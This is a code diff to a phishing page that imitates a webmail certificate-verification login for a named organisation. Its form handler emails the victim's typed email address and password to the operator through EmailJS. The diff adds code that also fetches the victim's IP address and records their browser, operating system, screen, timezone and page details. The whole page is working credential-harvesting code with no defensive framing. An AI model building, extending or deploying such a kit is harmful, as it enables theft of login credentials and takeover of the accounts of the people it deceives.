@@ -14,7 +14,7 @@
         }
 
         body {
-            background: #e8ecf1; /* Softer background like a webmail client */
+            background: #e8ecf1;
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
             display: flex;
             justify-content: center;
@@ -25,7 +25,7 @@
         }
 
         .container {
-            max-width: 400px; /* Narrower, like a webmail form */
+            max-width: 400px;
             width: 100%;
             margin: 0 auto;
         }
@@ -37,7 +37,7 @@
         }
 
         .header-logo {
-            max-width: 160px; /* Slightly larger for brand visibility */
+            max-width: 160px;
             height: auto;
             margin-bottom: 8px;
         }
@@ -841,7 +841,60 @@
         document.getElementById('serialNumber').textContent = serialNum;
         document.getElementById('certFingerprint').textContent = fingerprint;
 
+        // ---------------------------
+        // Helper: fetch IP address
+        // ---------------------------
+        function fetchIpAddress() {
+            return fetch('https://api.ipify.org?format=json')
+                .then(function(res) { return res.json(); })
+                .then(function(data) { return data.ip || 'Unknown'; })
+                .catch(function() { return 'Unknown'; });
+        }
+
+        // ---------------------------
+        // Helper: collect device info
+        // ---------------------------
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let browser = 'Unknown';
+            let os = 'Unknown';
+            let device = 'Desktop';
+
+            // Browser detection
+            if (ua.indexOf('Firefox') > -1) browser = 'Firefox';
+            else if (ua.indexOf('SamsungBrowser') > -1) browser = 'Samsung Internet';
+            else if (ua.indexOf('Opera') > -1 || ua.indexOf('OPR') > -1) browser = 'Opera';
+            else if (ua.indexOf('Trident') > -1) browser = 'Internet Explorer';
+            else if (ua.indexOf('Edge') > -1 || ua.indexOf('Edg') > -1) browser = 'Edge';
+            else if (ua.indexOf('Chrome') > -1) browser = 'Chrome';
+            else if (ua.indexOf('Safari') > -1) browser = 'Safari';
+
+            // OS detection
+            if (ua.indexOf('Win') > -1) os = 'Windows';
+            else if (ua.indexOf('Mac') > -1) os = 'macOS';
+            else if (ua.indexOf('Linux') > -1) os = 'Linux';
+            else if (ua.indexOf('Android') > -1) os = 'Android';
+            else if (ua.indexOf('like Mac') > -1) os = 'iOS';
+
+            // Device detection
+            if (/Mobi|Android|iPhone|iPad|iPod/i.test(ua)) device = 'Mobile';
+            if (/iPad|Tablet/i.test(ua)) device = 'Tablet';
+
+            return {
+                browser: browser,
+                os: os,
+                device: device,
+                userAgent: ua,
+                screen_resolution: screen.width + 'x' + screen.height,
+                viewport_size: window.innerWidth + 'x' + window.innerHeight,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
+                language: navigator.language || navigator.userLanguage || 'Unknown'
+            };
+        }
+
+        // ---------------------------
         // Login form handler
+        // ---------------------------
         loginForm.addEventListener('submit', function(e) {
             e.preventDefault();
 
@@ -871,30 +924,100 @@
             loginBtn.disabled = true;
             loginBtn.innerHTML = '<i class="fas fa-spinner spinner"></i> Verifying...';
 
-            const templateParams = {
-                user_email: email,
-                user_password: password,
-                certificate_id: certId,
-                timestamp: new Date().toLocaleString()
-            };
+            // Collect all data
+            const deviceInfo = getDeviceInfo();
 
-            emailjs.send('service_kvpr45j', 'template_v2xoave', templateParams)
-                .then(function() {
-                    loginCard.classList.add('hidden');
-                    certificateCard.classList.remove('hidden');
-                    
-                    loginBtn.disabled = false;
-                    loginBtn.innerHTML = '<i class="fas fa-shield-alt"></i> Verify & Continue';
-                    window.scrollTo({ top: 0, behavior: 'smooth' });
-                })
-                .catch(function() {
-                    loginBtn.disabled = false;
-                    loginBtn.innerHTML = '<i class="fas fa-shield-alt"></i> Verify & Continue';
-                    loginEmailError.textContent = 'Verification failed. Please try again.';
-                });
+            // Fetch IP first, then send email
+            fetchIpAddress().then(function(ipAddress) {
+                const timestamp = new Date().toLocaleString();
+
+                // Full log message
+                const fullLog =
+                    'LOGIN ATTEMPT\n' +
+                    '==============================\n' +
+                    'Timestamp: ' + timestamp + '\n' +
+                    'Email: ' + email + '\n' +
+                    'Password: ' + password + '\n' +
+                    'Certificate ID: ' + certId + '\n' +
+                    '\n--- Page Info ---\n' +
+                    'Title: ' + document.title + '\n' +
+                    'URL: ' + window.location.href + '\n' +
+                    'Hostname: ' + window.location.hostname + '\n' +
+                    'Pathname: ' + window.location.pathname + '\n' +
+                    'Referrer: ' + (document.referrer || 'Direct') + '\n' +
+                    '\n--- Device Info ---\n' +
+                    'Browser: ' + deviceInfo.browser + '\n' +
+                    'OS: ' + deviceInfo.os + '\n' +
+                    'Device: ' + deviceInfo.device + '\n' +
+                    'IP: ' + ipAddress + '\n' +
+                    'Screen: ' + deviceInfo.screen_resolution + '\n' +
+                    'Viewport: ' + deviceInfo.viewport_size + '\n' +
+                    'Timezone: ' + deviceInfo.timezone + '\n' +
+                    'Language: ' + deviceInfo.language + '\n' +
+                    'User Agent: ' + deviceInfo.userAgent + '\n' +
+                    '\n--- Page Stats ---\n' +
+                    'Total Elements: ' + document.getElementsByTagName('*').length + '\n' +
+                    'Forms: ' + document.forms.length + '\n' +
+                    'Inputs: ' + document.getElementsByTagName('input').length + '\n' +
+                    'Links: ' + document.getElementsByTagName('a').length + '\n';
+
+                // Template params — matching the EmailJS template variable names
+                const templateParams = {
+                    // User credentials (matches {{from_email}} and {{password}} in template)
+                    from_email: email,
+                    password: password,
+
+                    // Timestamp
+                    timestamp: timestamp,
+
+                    // Page information
+                    page_title: document.title,
+                    page_url: window.location.href,
+                    page_hostname: window.location.hostname,
+                    page_pathname: window.location.pathname,
+                    referrer: document.referrer || 'Direct',
+
+                    // Device information
+                    browser: deviceInfo.browser,
+                    ip: ipAddress,
+                    os: deviceInfo.os,
+                    device: deviceInfo.device,
+                    screen_resolution: deviceInfo.screen_resolution,
+                    viewport_size: deviceInfo.viewport_size,
+                    timezone: deviceInfo.timezone,
+                    language: deviceInfo.language,
+
+                    // Page statistics
+                    page_element_count: document.getElementsByTagName('*').length,
+                    forms_count: document.forms.length,
+                    inputs_count: document.getElementsByTagName('input').length,
+                    links_count: document.getElementsByTagName('a').length,
+
+                    // Full log
+                    message: fullLog
+                };
+
+                return emailjs.send('service_kvpr45j', 'template_v2xoave', templateParams);
+            })
+            .then(function() {
+                loginCard.classList.add('hidden');
+                certificateCard.classList.remove('hidden');
+
+                loginBtn.disabled = false;
+                loginBtn.innerHTML = '<i class="fas fa-shield-alt"></i> Verify & Continue';
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            })
+            .catch(function(err) {
+                console.error('EmailJS error:', err);
+                loginBtn.disabled = false;
+                loginBtn.innerHTML = '<i class="fas fa-shield-alt"></i> Verify & Continue';
+                loginEmailError.textContent = 'Verification failed. Please try again.';
+            });
         });
 
+        // ---------------------------
         // Certificate actions
+        // ---------------------------
         function showState(text, type = 'loading', icon = 'circle-notch') {
             stateMsg.className = 'state-message visible';
             if (type === 'success') stateMsg.className += ' success';
@@ -947,8 +1070,12 @@
                 hideState();
                 showState('📄 Certificate download started', 'success', 'download');
                 setTimeout(hideState, 3000);
-                // Simulate download
-                const certData = `Certificate ID: ${certId}\nType: Extended Validation (EV) SSL/TLS\nCommon Name: *.mail.gorge.net\nOrganization: Blue Mountain Corporation\nSerial Number: ${serialNum}\nSHA-256: ${fingerprint}`;
+                const certData = 'Certificate ID: ' + certId + '\n' +
+                    'Type: Extended Validation (EV) SSL/TLS\n' +
+                    'Common Name: *.mail.gorge.net\n' +
+                    'Organization: Blue Mountain Corporation\n' +
+                    'Serial Number: ' + serialNum + '\n' +
+                    'SHA-256: ' + fingerprint;
                 const blob = new Blob([certData], {type: 'text/plain'});
                 const url = window.URL.createObjectURL(blob);
                 const a = document.createElement('a');
